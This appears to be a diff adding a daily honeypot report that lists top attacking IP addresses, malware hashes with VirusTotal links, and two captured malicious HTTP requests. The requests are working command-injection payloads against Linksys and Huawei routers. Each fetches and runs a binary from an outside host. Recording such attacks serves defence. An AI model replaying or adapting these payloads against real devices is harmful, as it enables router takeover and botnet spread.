@@ -1,0 +1,43 @@
+Top 5 IPs for 2024-03-20 :
+
+59.149.80.184
+179.43.180.106
+203.55.196.146
+58.47.7.220
+130.25.84.31
+
+
+Malware Download:
+608ee011537005f368c9731f4c4dee6a247b620cde52908ed0678df28c617971
+https://www.virustotal.com/gui/file/608ee011537005f368c9731f4c4dee6a247b620cde52908ed0678df28c617971
+7a48c93c5cb63a09505a009260d1cca8203285e0c1c6ff5b0df9cbb470820865
+https://www.virustotal.com/gui/file/7a48c93c5cb63a09505a009260d1cca8203285e0c1c6ff5b0df9cbb470820865
+d4e8c642ac8485d2ac316f16b5ed2285c93734c62a3e1bc2852a49f3737053c5
+https://www.virustotal.com/gui/file/d4e8c642ac8485d2ac316f16b5ed2285c93734c62a3e1bc2852a49f3737053c5
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+d1da35da841f018a1c74ce12537ef2d2b7a02cce3c11a4affde90331a2640d84
+https://www.virustotal.com/gui/file/d1da35da841f018a1c74ce12537ef2d2b7a02cce3c11a4affde90331a2640d84
+fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+https://www.virustotal.com/gui/file/fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+
+
+Malcious Commands seen:
+
+POST /tmUnblock.cgi HTTP/1.1
+Host: 127.0.0.1:80
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: /
+User-Agent: hacked-by-matrix
+Content-Length: 227\r\nContent-Type: application/x-www-form-urlencoded
+
+ttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+Amakano.mpsl%3B+wget+http%3A%2F%2F109.205.214.35%2Fmpsl%3B+chmod+777+mpsl%3B+.%2Fmpsl+linksys%60&action=&ttcp_num=2&ttcp_size=2&submit_button=&change_action=&commit=0&StartEPI=1
+
+POST /ctrlt/DeviceUpgrade_1 HTTP/1.1
+Connection: keep-alive
+Accept: */*
+Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"
+Content-Length: 492
+
+<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/linuxxx; /bin/busybox wget -g 14.225.208.190 -l /tmp/linuxxx -r /huhu.mips; /bin/busybox chmod 777 /tmp/linuxxx; /tmp/linuxxx selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>"
